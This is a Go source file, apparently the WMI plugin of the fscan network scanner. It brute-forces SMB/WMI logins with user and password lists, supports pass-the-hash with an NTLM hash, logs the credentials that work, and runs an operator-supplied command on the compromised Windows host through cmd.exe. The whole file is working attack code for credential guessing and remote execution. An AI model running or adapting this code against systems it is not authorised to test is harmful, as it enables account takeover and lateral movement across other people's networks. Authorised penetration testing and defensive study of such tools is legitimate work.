package Plugins

import (
	"errors"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"os"
	"strings"
	"time"

	"github.com/C-Sto/goWMIExec/pkg/wmiexec"
)

var ClientHost string
var flag bool

func init() {
	if flag {
		return
	}
	clientHost, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	ClientHost = clientHost
	flag = true
}

func WmiExec(info *common.HostInfo) (tmperr error) {
	if common.IsBrute {
		return nil
	}
	starttime := time.Now().Unix()
	for _, user := range common.Userdict["smb"] {
	PASS:
		for _, pass := range common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := Wmiexec(info, user, pass, common.Hash)
			errlog := fmt.Sprintf("[-] WmiExec %v:%v %v %v %v", info.Host, 445, user, pass, err)
			errlog = strings.Replace(errlog, "\n", "", -1)
			common.LogError(errlog)
			if flag == true {
				var result string
				if common.Domain != "" {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v\\%v ", info.Host, info.Ports, common.Domain, user)
				} else {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v ", info.Host, info.Ports, user)
				}
				if common.Hash != "" {
					result += "hash: " + common.Hash
				} else {
					result += pass
				}
				common.LogSuccess(result)
				return err
			} else {
				tmperr = err
				if common.CheckErrs(err) {
					return err
				}
				if time.Now().Unix()-starttime > (int64(len(common.Userdict["smb"])*len(common.Passwords)) * common.Timeout) {
					return err
				}
			}
			if len(common.Hash) == 32 {
				break PASS
			}
		}
	}
	return tmperr
}

func Wmiexec(info *common.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	wmiexec.Timeout = int(common.Timeout)
	return WMIExec(target, user, pass, hash, common.Domain, common.Command, ClientHost, "", nil)
}

func WMIExec(target, username, password, hash, domain, command, clientHostname, binding string, cfgIn *wmiexec.WmiExecConfig) (flag bool, err error) {
	if cfgIn == nil {
		cfg, err1 := wmiexec.NewExecConfig(username, password, hash, domain, target, clientHostname, true, nil, nil)
		if err1 != nil {
			err = err1
			return
		}
		cfgIn = &cfg
	}
	execer := wmiexec.NewExecer(cfgIn)
	err = execer.SetTargetBinding(binding)
	if err != nil {
		return
	}

	err = execer.Auth()
	if err != nil {
		return
	}
	flag = true

	if command != "" {
		command = "C:\\Windows\\system32\\cmd.exe /c " + command
		if execer.TargetRPCPort == 0 {
			err = errors.New("RPC Port is 0, cannot connect")
			return
		}

		err = execer.RPCConnect()
		if err != nil {
			return
		}
		err = execer.Exec(command)
		if err != nil {
			return
		}
	}
	return
}
